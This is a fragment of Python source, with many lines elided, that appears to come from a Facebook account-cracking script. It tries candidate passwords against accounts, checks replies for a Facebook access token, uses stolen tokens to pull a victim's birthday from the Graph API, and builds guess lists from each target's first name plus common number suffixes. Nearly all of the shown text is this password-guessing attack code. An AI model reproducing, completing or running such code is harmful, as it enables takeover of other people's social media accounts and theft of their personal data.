        ...
        for pw in __yan__:
            ...
            if 'access_token' in response.text and 'EAAA' in response.text:
                ...
                try:
                    ...
                    cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%sr' % (user, sultani)).json()['birthday']
                ...
                for yntkts in self.id:
                    try:
                        ...
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            ...
                            pwx = [name, xz[0] + '123@', xz[0] + '12345@', xz[0] + '1122@', xz[0] + '112233@', xz[0] + '1122334455@', xz[0]  + '1234@', xz[0] + '123321', xz[0] + '100200@', xz[0] + '12344321@', xz[0] + '1999', xz[0] + '2000@', xz[0] + '123456789@', xz[0] + '112233445566@', xz[0] + '11223344@', xz[0] + '1234554321@', xz[0] + '123456@', xz[0] + '1990@', xz[0] + '1212@', xz[0] + '123123@', xz[0] + '786@', xz[0] + '100200300@', xz[0] + '2007@', xz[0] + '112233332211', xz[0] + '2003@', xz[0] + '54321@', xz[0] + '321@', xz[0] + '2001@', xz[0] + '2002@', xz[0] + '2004@', xz[0] + '2005@', xz[0] + '2006@', xz[0] + '2010@', xz[0] + '4321@', xz[0] + '1234@', xz[0] + '123@', xz[0] + '12345@', xz[0] + '987654321@', xz[0] + '102030@']
